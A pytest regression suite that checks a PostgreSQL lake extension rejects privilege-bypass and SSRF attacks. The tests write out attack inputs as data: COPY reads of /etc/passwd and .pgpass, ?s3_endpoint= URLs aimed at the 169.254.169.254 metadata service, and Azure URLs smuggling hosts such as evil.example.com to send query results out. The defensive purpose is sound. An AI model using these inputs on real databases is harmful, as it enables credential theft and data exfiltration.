"""
Security regression tests for pg_lake_copy privilege-check bypass and SSRF
vulnerabilities.
"""

import pytest
from utils_pytest import *


@pytest.fixture(scope="module")
def noaccess_conn(postgres):
    """Connection for a user without pg_read/write_server_files privileges."""
    admin = open_pg_conn()
    res = run_query(
        """
        SELECT rolname FROM (
            SELECT ('noaccess_' || floor(random() * 1000)) rolname FROM generate_series(1,10)
        ) candidates
        WHERE rolname NOT IN (SELECT rolname FROM pg_roles)
        LIMIT 1
        """,
        admin,
    )
    user = res[0]["rolname"]
    run_command(
        f"CREATE USER {user}; GRANT USAGE, CREATE ON SCHEMA public TO {user};",
        admin,
    )
    admin.commit()
    conn = open_pg_conn(user)
    yield conn
    conn.close()
    run_command(f"DROP OWNED BY {user} CASCADE; DROP ROLE {user};", admin)
    admin.commit()
    admin.close()


def test_copy_from_local_path_is_rejected(noaccess_conn):
    """
    Regression test for: unprivileged COPY FROM local path -> arbitrary server
    file read via DuckDB read_csv/read_json.

    ProcessPgLakeCopyFrom() only called CheckURLReadAccess() when
    IsSupportedURL() was true.  A local path returned false, so the function
    fell through with no access check.  DuckDB's unrestricted LocalFileSystem
    then opened the file as the pgduck_server OS user.

    Fix: replicate PostgreSQL's standard pg_read_server_files check on the
    local-path branch, so an unprivileged role is rejected with
    INSUFFICIENT_PRIVILEGE while members of pg_read_server_files (and
    superusers) can still COPY FROM a local file.
    """
    noaccess_conn.rollback()
    run_command(
        "CREATE TEMP TABLE sec_leak (line text)",
        noaccess_conn,
    )
    noaccess_conn.commit()

    for local_path in ("/etc/passwd", "/tmp/test.json", "/home/postgres/.pgpass"):
        error = run_command(
            f"COPY sec_leak FROM '{local_path}' WITH (format 'json')",
            noaccess_conn,
            raise_error=False,
        )
        noaccess_conn.rollback()

        assert error is not None, (
            f"SECURITY REGRESSION: COPY FROM '{local_path}' did not raise an error. "
            "Local paths must be rejected by ProcessPgLakeCopyFrom()."
        )
        assert (
            "not supported" in error.lower() or "permission denied" in error.lower()
        ), f"Expected a 'not supported' or 'permission denied' error for local path, got: {error}"


def test_copy_from_local_glob_is_rejected(noaccess_conn):
    """
    DuckDB honours glob patterns, so '/home/postgres/**/*' would enumerate and
    dump every readable file.  Local glob paths must also be rejected.
    """
    noaccess_conn.rollback()
    run_command(
        "CREATE TEMP TABLE sec_leak_glob (line text)",
        noaccess_conn,
    )
    noaccess_conn.commit()

    error = run_command(
        "COPY sec_leak_glob FROM '/home/**/*.json' WITH (format 'json')",
        noaccess_conn,
        raise_error=False,
    )
    noaccess_conn.rollback()

    assert (
        error is not None
    ), "SECURITY REGRESSION: COPY FROM glob local path did not raise an error."


def test_copy_to_local_path_is_rejected(noaccess_conn):
    """
    Same class of bug as the FROM side, on the write path.  ProcessPgLakeCopyTo()
    only called CheckURLWriteAccess() for URLs, so a local path was silently
    handed to DuckDB and written as the pgduck_server OS user.

    Fix: replicate PostgreSQL's standard pg_write_server_files check on the
    local-path branch, so an unprivileged role is rejected with
    INSUFFICIENT_PRIVILEGE while members of pg_write_server_files (and
    superusers) can still COPY TO a local file.
    """
    noaccess_conn.rollback()

    for local_path in ("/tmp/sec_write_leak.parquet", "/tmp/sec_write_leak.json"):
        error = run_command(
            f"COPY (SELECT 1 AS x) TO '{local_path}' WITH (format 'parquet')",
            noaccess_conn,
            raise_error=False,
        )
        noaccess_conn.rollback()

        assert error is not None, (
            f"SECURITY REGRESSION: COPY TO '{local_path}' did not raise an error. "
            "Local paths must require pg_write_server_files in ProcessPgLakeCopyTo()."
        )
        assert (
            "permission denied" in error.lower() or "not supported" in error.lower()
        ), f"Expected a 'permission denied' or 'not supported' error for local path, got: {error}"


def test_duplicate_format_option_is_rejected(pg_conn, s3):
    """
    Regression test for the duplicate-format bypass: WITH (format 'json', format 'csv')
    caused OptionsToCopyDataFormat (first-wins) to return json while
    FindDataFormatAndCompression (last-wins) returned csv, letting an attacker
    pass the json/parquet gate but execute read_csv against any text file.

    Fix: FindDataFormatAndCompression must error on duplicate format options.
    """
    url = f"s3://{TEST_BUCKET}/sec_test_dup_fmt/data.json"

    # Write a minimal valid JSON file first so the URL exists
    run_command(
        f"COPY (SELECT 1 AS x) TO '{url}' WITH (format 'json')",
        pg_conn,
        raise_error=False,
    )
    pg_conn.commit()

    run_command(
        "CREATE TEMP TABLE sec_dup_fmt (x int)",
        pg_conn,
    )
    pg_conn.commit()

    error = run_command(
        f"COPY sec_dup_fmt FROM '{url}' WITH (format 'json', format 'csv')",
        pg_conn,
        raise_error=False,
    )
    pg_conn.rollback()

    assert error is not None, (
        "SECURITY REGRESSION: duplicate 'format' option was silently accepted. "
        "FindDataFormatAndCompression must reject duplicate format options."
    )
    assert (
        "duplicate" in error.lower() or "format" in error.lower()
    ), f"Expected a 'duplicate format' error, got: {error}"


def test_combined_attack_local_path_plus_duplicate_format_is_rejected(noaccess_conn):
    """
    Combined attack: COPY FROM '/etc/passwd' WITH (format 'json', format 'csv').
    Both bugs together would (a) let the json gate pass and (b) route to read_csv
    for unrestricted text-file enumeration.  Either fix alone blocks the attack;
    both together ensure defense in depth.
    """
    noaccess_conn.rollback()
    run_command(
        "CREATE TEMP TABLE sec_combined (line text)",
        noaccess_conn,
    )
    noaccess_conn.commit()

    error = run_command(
        "COPY sec_combined FROM '/etc/passwd' WITH (format 'json', format 'csv')",
        noaccess_conn,
        raise_error=False,
    )
    noaccess_conn.rollback()

    assert (
        error is not None
    ), "SECURITY REGRESSION: combined local-path + duplicate-format attack succeeded."


def test_s3_url_with_s3_endpoint_query_param_is_rejected(pg_conn, s3, extension):
    """
    Regression test for: lake_read SSRF with response readback via
    ?s3_endpoint= in COPY FROM URL.

    A URL like s3://bucket/key?s3_endpoint=169.254.169.254&s3_use_ssl=false
    causes DuckDB's ReadQueryParams() to override the S3 endpoint and send
    the HTTP request to any internal host (e.g. IMDS), with the full response
    body returned as query rows.  IsSupportedURL() only checked the scheme
    prefix; the '?' query string was never inspected.

    Fix: CheckUserSuppliedURL() rejects cloud-storage URLs containing '?'.
    """
    url = f"s3://{TEST_BUCKET}/sec_test/data.parquet?s3_endpoint=169.254.169.254&s3_use_ssl=false&s3_url_style=path"

    run_command("CREATE TEMP TABLE sec_ssrf_s3 (doc jsonb)", pg_conn)
    pg_conn.commit()

    error = run_command(
        f"COPY sec_ssrf_s3 FROM '{url}' WITH (format 'json')",
        pg_conn,
        raise_error=False,
    )
    pg_conn.rollback()

    assert error is not None, (
        "SECURITY REGRESSION: COPY FROM URL with ?s3_endpoint= query string "
        "was accepted without error. "
        "CheckUserSuppliedURL() must reject cloud-storage URLs containing '?'."
    )
    assert (
        "query parameters" in str(error).lower()
        or "not permitted" in str(error).lower()
    ), f"Expected 'query parameters are not permitted' error, got: {error}"


def test_s3_url_with_any_query_string_is_rejected_for_foreign_table(
    pg_conn, s3, extension
):
    """
    The ?s3_endpoint= attack also works via CREATE FOREIGN TABLE path option,
    since every SELECT on the table calls GetIcebergMetadataLocation and the
    URL (with query string) is forwarded verbatim to pgduck_server.
    """
    url = f"s3://{TEST_BUCKET}/sec_test/data.parquet?s3_endpoint=169.254.169.254"

    error = run_command(
        f"""
        CREATE FOREIGN TABLE sec_ssrf_ft (id int)
        SERVER pg_lake OPTIONS (path '{url}', format 'parquet')
        """,
        pg_conn,
        raise_error=False,
    )
    pg_conn.rollback()

    assert error is not None, (
        "SECURITY REGRESSION: CREATE FOREIGN TABLE with ?s3_endpoint= in path "
        "option was accepted without error. "
        "CheckUserSuppliedURL() must reject cloud-storage URLs containing '?'."
    )
    assert (
        "query parameters" in str(error).lower()
        or "not permitted" in str(error).lower()
    ), f"Expected rejection of URL query parameters, got: {error}"


def test_clean_s3_url_still_works(pg_conn, s3, extension):
    """
    Sanity check: a clean s3:// URL without query parameters must still
    work after the fix.  Ensures CheckUserSuppliedURL() does not break
    legitimate use.
    """
    url = f"s3://{TEST_BUCKET}/sec_clean_url_test/data.csv"

    run_command(
        f"COPY (SELECT 1 AS id, 'hello' AS val) TO '{url}' WITH (format 'csv')",
        pg_conn,
    )
    pg_conn.commit()

    run_command("CREATE TEMP TABLE sec_clean (id int, val text)", pg_conn)
    pg_conn.commit()

    run_command(
        f"COPY sec_clean FROM '{url}' WITH (format 'csv')",
        pg_conn,
    )
    pg_conn.rollback()


def test_copy_to_http_url_is_rejected(pg_conn, s3, extension):
    """
    Bare http(s):// has no legitimate write target in pg_lake; the only
    realistic use is exfiltrating query results to an internal HTTP service.
    CheckURLWriteAccess() now rejects http(s):// writes unconditionally
    (no superuser bypass).
    """
    url = "http://169.254.169.254/sink"

    error = run_command(
        f"COPY (SELECT 1) TO '{url}' WITH (format 'csv')",
        pg_conn,
        raise_error=False,
    )
    pg_conn.rollback()

    assert error is not None, "SECURITY REGRESSION: COPY TO http:// URL was accepted."
    assert (
        "not permitted" in str(error).lower() or "http" in str(error).lower()
    ), f"Expected http write rejection, got: {error}"


def test_copy_to_s3_url_with_query_param_is_rejected(pg_conn, s3, extension):
    """
    Regression test for: COPY TO 's3://bucket/key?s3_endpoint=...' would have
    bypassed the SSRF check on the write path. CheckURLWriteAccess() did not
    call CheckUserSuppliedURL(), so an attacker could redirect the upload to
    an internal host. CheckURLWriteAccess() now applies the same query-param
    allowlist as the read path.
    """
    url = f"s3://{TEST_BUCKET}/sec_write_ssrf/data.csv?s3_endpoint=169.254.169.254"

    error = run_command(
        f"COPY (SELECT 1 AS id) TO '{url}' WITH (format 'csv')",
        pg_conn,
        raise_error=False,
    )
    pg_conn.rollback()

    assert error is not None, (
        "SECURITY REGRESSION: COPY TO s3://...?s3_endpoint= was accepted. "
        "CheckURLWriteAccess() must reject disallowed "
        "query parameters on the write path."
    )
    assert (
        "query parameter" in str(error).lower() or "not permitted" in str(error).lower()
    ), f"Expected query-parameter rejection on write, got: {error}"


def test_s3_url_with_safe_query_param_is_accepted(pg_conn, s3, extension):
    """
    Sanity check: legitimate query params on the allowlist (s3_region,
    s3_requester_pays) must still pass through both read and write paths.
    """
    url = f"s3://{TEST_BUCKET}/sec_safe_query/data.csv?s3_region=us-east-1"

    run_command(
        f"COPY (SELECT 1 AS id, 'hi' AS val) TO '{url}' WITH (format 'csv')",
        pg_conn,
    )
    pg_conn.commit()

    run_command("CREATE TEMP TABLE sec_safe_q (id int, val text)", pg_conn)
    pg_conn.commit()

    run_command(
        f"COPY sec_safe_q FROM '{url}' WITH (format 'csv')",
        pg_conn,
    )
    pg_conn.rollback()


def test_iceberg_metadata_function_rejects_query_string(pg_conn, s3, extension):
    """
    iceberg_metadata(), iceberg_files() and iceberg_snapshots() take a
    user-supplied metadata URI and fetch its contents.  The ?s3_endpoint=
    redirect would expose internal HTTP responses verbatim.
    """
    url = f"s3://{TEST_BUCKET}/sec_meta/v1.metadata.json?s3_endpoint=169.254.169.254"

    for fn in ("lake_iceberg.metadata", "lake_iceberg.files", "lake_iceberg.snapshots"):
        error = run_command(
            f"SELECT * FROM {fn}('{url}')",
            pg_conn,
            raise_error=False,
        )
        pg_conn.rollback()

        assert error is not None, (
            f"SECURITY REGRESSION: {fn}() accepted a URL with ?s3_endpoint= "
            "query string."
        )
        assert (
            "query parameters" in str(error).lower()
            or "not permitted" in str(error).lower()
        ), f"Expected query-parameter rejection from {fn}(), got: {error}"


def test_create_table_load_from_with_query_string_is_rejected(pg_conn, s3, extension):
    """
    CREATE TABLE WITH (load_from = 's3://...?s3_endpoint=...') would let an
    attacker smuggle a DuckDB endpoint override through the load_from
    option.  The '?' rejection on cloud URLs in CheckURLReadAccess covers
    this entry point too.
    """
    url = f"s3://{TEST_BUCKET}/sec_load_from_q/data.csv?s3_endpoint=169.254.169.254"
    error = run_command(
        f"CREATE TABLE sec_load_from_q () WITH (load_from = '{url}', format = 'csv')",
        pg_conn,
        raise_error=False,
    )
    pg_conn.rollback()

    assert error is not None, (
        "SECURITY REGRESSION: CREATE TABLE with load_from='s3://...?...' was "
        "accepted."
    )
    assert (
        "query parameters" in str(error).lower()
        or "not permitted" in str(error).lower()
    ), f"Expected ?-query rejection, got: {error}"


AZURE_SSRF_URLS = [
    # abfss://<container>@<account>.<endpoint>/<path>: the endpoint half of the
    # host is whatever the user writes, so the request goes wherever they point
    # it.  No query string is involved, so the s3_endpoint= allowlist never ran.
    "abfss://c@169.254.169.254/data.csv",
    "abfss://c@account.internal.example.com/data.csv",
    # a host that only looks like it is under the allowed suffix
    "abfss://c@account.dfs.core.windows.net.evil.example.com/data.csv",
    "abfss://c@evilblob.core.windows.net/data.csv",
    # userinfo smuggling: the Azure SDK reads everything before the last '@' as
    # userinfo, so this connects to evil.example.com
    "abfss://c@account.dfs.core.windows.net@evil.example.com/data.csv",
    # (azure|az)://<account>.<endpoint>/<container>/<path> is the same vector
    # without an '@' at all
    "az://account.internal.example.com/c/data.csv",
    "azure://account.internal.example.com/c/data.csv",
    # a dot in the container name makes DuckDB's parser split the host
    # somewhere else, reaching a single-label internal host
    "abfss://c.d@internal-service/data.csv",
    # a bracketed IPv6 literal is an explicit endpoint with no dot, so it must
    # not slip past the host check the way a dotless secret-derived host does
    "abfss://c@[::1]/data.csv",
    "az://[fd00::1]/c/data.csv",
]


@pytest.mark.parametrize("url", AZURE_SSRF_URLS)
def test_azure_url_with_unallowed_host_is_rejected(pg_conn, extension, url):
    """
    Regression test for the Azure half of the endpoint-override SSRF: Azure
    schemes carry the storage endpoint in the URL host, not the query string,
    so CheckUserSuppliedURL()'s query-parameter allowlist returned early and
    the URL reached DuckDB's azure filesystem, which issues the request to
    https://<account>.<endpoint> as the URL spells it.

    Fix: CheckAzureURLHost() requires the host to sit under
    pg_lake.allowed_azure_host_suffixes.
    """
    run_command("CREATE TEMP TABLE IF NOT EXISTS sec_ssrf_azure (doc jsonb)", pg_conn)
    pg_conn.commit()

    error = run_command(
        f"COPY sec_ssrf_azure FROM '{url}' WITH (format 'json')",
        pg_conn,
        raise_error=False,
    )
    pg_conn.rollback()

    assert error is not None, (
        f"SECURITY REGRESSION: COPY FROM '{url}' was accepted. "
        "CheckAzureURLHost() must reject Azure URLs naming a host outside "
        "pg_lake.allowed_azure_host_suffixes."
    )
    assert (
        "not permitted" in str(error).lower() or "malformed" in str(error).lower()
    ), f"Expected an Azure host rejection, got: {error}"


@pytest.mark.parametrize("url", AZURE_SSRF_URLS)
def test_azure_url_with_unallowed_host_is_rejected_on_write(pg_conn, extension, url):
    """
    Same vector on the write path, which exfiltrates the query result to the
    chosen host instead of reading its response back.
    """
    error = run_command(
        f"COPY (SELECT 1 AS id) TO '{url}' WITH (format 'csv')",
        pg_conn,
        raise_error=False,
    )
    pg_conn.rollback()

    assert (
        error is not None
    ), f"SECURITY REGRESSION: COPY TO '{url}' was accepted on the write path."
    assert (
        "not permitted" in str(error).lower() or "malformed" in str(error).lower()
    ), f"Expected an Azure host rejection on write, got: {error}"


def test_azure_url_with_unallowed_host_is_rejected_for_foreign_table(
    pg_conn, extension
):
    """
    The path option of a foreign table is the other user-supplied URL entry
    point, and every SELECT on the table forwards it to pgduck_server.
    """
    url = "abfss://c@account.internal.example.com/data.parquet"

    error = run_command(
        f"""
        CREATE FOREIGN TABLE sec_ssrf_azure_ft (id int)
        SERVER pg_lake OPTIONS (path '{url}', format 'parquet')
        """,
        pg_conn,
        raise_error=False,
    )
    pg_conn.rollback()

    assert (
        error is not None
    ), "SECURITY REGRESSION: CREATE FOREIGN TABLE with an Azure SSRF path was accepted."
    assert (
        "not permitted" in str(error).lower()
    ), f"Expected an Azure host rejection, got: {error}"


def test_azure_url_with_allowed_host_passes_the_url_check(pg_conn, extension):
    """
    A fully qualified URL under an allowed suffix must get past the URL check.
    There is no such account here, so the read still fails, but it must fail in
    the storage client rather than in CheckAzureURLHost().
    """
    for url in (
        "abfss://c@someaccount.dfs.core.windows.net/data.csv",
        "az://someaccount.blob.core.windows.net/c/data.csv",
    ):
        error = run_command(
            f"COPY (SELECT 1 AS id) TO '{url}' WITH (format 'csv')",
            pg_conn,
            raise_error=False,
        )
        pg_conn.rollback()

        assert "not permitted" not in str(error).lower(), (
            f"'{url}' is under an allowed host suffix and must not be rejected "
            f"by the URL check, got: {error}"
        )


def test_azure_container_url_still_works(pg_conn, azure, extension):
    """
    az://<container>/<path> names no host at all: DuckDB takes both the account
    and the endpoint from the Azure secret, which only an admin can create.  It
    is the form every Azure test uses and must keep working.
    """
    url = f"az://{TEST_BUCKET}/sec_azure_clean/data.csv"

    run_command(
        f"COPY (SELECT 1 AS id, 'hi' AS val) TO '{url}' WITH (format 'csv')",
        pg_conn,
    )
    pg_conn.commit()

    run_command("CREATE TEMP TABLE sec_azure_clean (id int, val text)", pg_conn)
    pg_conn.commit()

    run_command(f"COPY sec_azure_clean FROM '{url}' WITH (format 'csv')", pg_conn)
    pg_conn.rollback()


def test_azure_host_suffix_setting_is_not_user_settable(noaccess_conn):
    """
    The allowlist is the escape hatch for a private or sovereign endpoint, so a
    role that can supply URLs must not be able to widen it.  PGC_SUSET keeps it
    to superusers.
    """
    noaccess_conn.rollback()

    error = run_command(
        "SET pg_lake.allowed_azure_host_suffixes TO '.internal.example.com'",
        noaccess_conn,
        raise_error=False,
    )
    noaccess_conn.rollback()

    assert error is not None, (
        "SECURITY REGRESSION: a non-superuser changed "
        "pg_lake.allowed_azure_host_suffixes, which defeats the host check."
    )
    assert (
        "permission denied" in str(error).lower()
    ), f"Expected a permission error, got: {error}"


def test_azure_host_suffix_setting_widens_the_allowlist(extension):
    """
    An admin running against a private endpoint has to be able to allow it, so
    the same URL must go from rejected to accepted by the URL check once the
    suffix is on the list.
    """
    url = "abfss://c@account.internal.example.com/data.csv"
    admin = open_pg_conn()

    try:
        error = run_command(
            f"COPY (SELECT 1 AS id) TO '{url}' WITH (format 'csv')",
            admin,
            raise_error=False,
        )
        admin.rollback()
        assert (
            "not permitted" in str(error).lower()
        ), f"Expected a rejection, got: {error}"

        run_command(
            "SET pg_lake.allowed_azure_host_suffixes TO '.internal.example.com'", admin
        )
        error = run_command(
            f"COPY (SELECT 1 AS id) TO '{url}' WITH (format 'csv')",
            admin,
            raise_error=False,
        )
        admin.rollback()

        assert (
            "not permitted" not in str(error).lower()
        ), f"Expected the URL check to accept the allowed host, got: {error}"
    finally:
        admin.close()


def test_azure_host_suffix_setting_rejects_a_malformed_list(extension):
    """
    The suffix list is read on every user-supplied Azure URL, so a list that
    does not parse has to fail at SET time.  Without a check hook the SET
    succeeds and every Azure URL then fails somewhere unrelated instead.
    """
    admin = open_pg_conn()
    setting = "pg_lake.allowed_azure_host_suffixes"

    try:
        error = run_command(
            f"SET {setting} TO '\".blob.core.windows.net'",
            admin,
            raise_error=False,
        )
        admin.rollback()

        assert error is not None, "Expected the malformed suffix list to be rejected"
        assert (
            "comma-separated list" in str(error).lower()
        ), f"Expected the list-parse detail, got: {error}"

        current = run_query(f"SHOW {setting}", admin)
        remaining = current[0][setting]
        assert (
            ".blob.core.windows.net" in remaining
        ), f"A rejected SET must leave the previous list in place, got: {remaining}"
    finally:
        admin.close()
